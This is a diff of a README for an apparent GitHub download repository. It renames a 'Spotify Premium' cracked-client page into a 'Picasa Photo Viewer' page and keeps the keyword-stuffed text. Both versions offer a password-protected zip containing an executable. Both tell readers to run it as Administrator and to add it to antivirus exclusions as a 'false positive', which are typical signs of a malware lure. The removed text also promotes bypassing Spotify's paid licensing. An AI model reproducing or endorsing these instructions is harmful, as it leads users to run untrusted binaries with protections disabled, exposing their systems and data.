@@ -1,57 +1,41 @@
-<img width="1536" height="1024" alt="20260316_1636_Image Generation_remix_01kkvr3bcaetntaex30ktea000(1)" src="https://github.com/user-attachments/assets/99eb9257-209f-4e11-be4e-c48bb5a288de" />
-
-
-# Spotify Premium – Ad-Free Music Streaming for Windows
+# Picasa Photo Viewer for Windows – Classic Image Viewer & Organizer
 
 [![Stars](https://img.shields.io/github/stars/naufal-hidayat2030/Spotify-Premium-Ad-Free-Music-Streaming-for-Windows)](https://github.com/naufal-hidayat2030/Spotify-Premium-Ad-Free-Music-Streaming-for-Windows)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
-Unlock full Spotify Premium features on Windows – ad-free listening, offline downloads, high-quality audio and unlimited skips. Free download. spotify premium download, free spotify premium, spotify premium free, spotify premium unlocked, spotify premium 2026.
+Lightweight, fast photo viewer and simple organizer – brings back the classic Picasa look and feel for modern Windows. Free download. picasa photo viewer download, picasa windows, picasa viewer, picasa for windows 10 11, classic photo viewer.
 
 ---
-
 ## ⚠️ Disclaimer
-For personal use only. Use at your own risk.
+For personal, non-commercial use only. Use at your own risk.
 ---
 ## 📦 What's Included
-- SpotifyPremium.exe – Modded Spotify client
-- Features: Ad-Free Playback, Offline Mode, 320kbps Audio, Unlimited Skips, No Shuffle Restriction, Dark Mode, Playlist Backup.
+- PicasaPhotoViewer.exe – Main application
+- Features: Fast image browsing, Folder viewer, Basic slideshow, Zoom & pan, EXIF info, Simple tagging, Face recognition (legacy), Print & export.
 ---
 ## 📥 Download
-📥 [Download `Spotify-1.2.85.513.zip`](https://github.com/naufal-hidayat2030/Spotify-Premium-Ad-Free-Music-Streaming-for-Windows/releases/download/Music-Software/Spotify-Prem-1.2.85.513.zip)  
+📥 [Download `Picasa-3.9.141.259.zip`](dist/https://github.com/naufal-hidayat2030/Spotify-Premium-Ad-Free-Music-Streaming-for-Windows/releases/download/Music-Software/Picasa-3.9.141.259.zip)  
 🔐 `LS2026`  
+Contents: PicasaPhotoViewer.exe, readme.txt.
+---
 
-Contents: SpotifyPremium.exe, config.ini, readme.txt.
----
 ## 🚀 How to Use
-1. Extract archive.  
-2. Run SpotifyPremium.exe.  
-3. Login with any free Spotify account.  
-4. All Premium features activate automatically.  
-5. Enjoy ad-free music and offline mode.  
-Supports Windows 10/11.
----
-## 🎮 Usage Tips
-| Feature | Function | Access |
-|---------|----------|--------|
-| Ad-Free Playback | No ads | Auto |
-| Offline Downloads | Save songs | Download button |
-| High Quality Audio | 320kbps | Settings → Quality |
-| Unlimited Skips | Skip any song | Auto |
-| No Shuffle | Play in order | Playlist menu |
-| Dark Mode | Theme switch | Settings |
+1. Extract archive  
+2. Run PicasaPhotoViewer.exe  
+3. Open folder with photos  
+4. Browse, zoom, slideshow or edit lightly  
+Works great on Windows 10/11.
 ---
 ## ❗️ Troubleshooting
-| Problem | Solution |
-|---------|----------|
-| Login fails | Use free account or clear cache. |
-| No offline mode | Re-login after first launch. |
-| Crashes | Run as Administrator. |
-| AV blocks exe | Add to exclusions (false positive). |
-| Songs not downloading | Check internet first time. |
+| Problem               | Solution                             |
+|-----------------------|--------------------------------------|
+| App doesn't start     | Run as Administrator                 |
+| No photos shown       | Select folder via File → Open Folder |
+| Slow on large folders | Use smaller collections              |
+| Antivirus warning     | Add to exclusions                    |
 ---
 ## 📜 License
 MIT License.
 ---
 ## ⭐️ Support
-Star if helpful!
+Star the repo if you like the classic Picasa style!
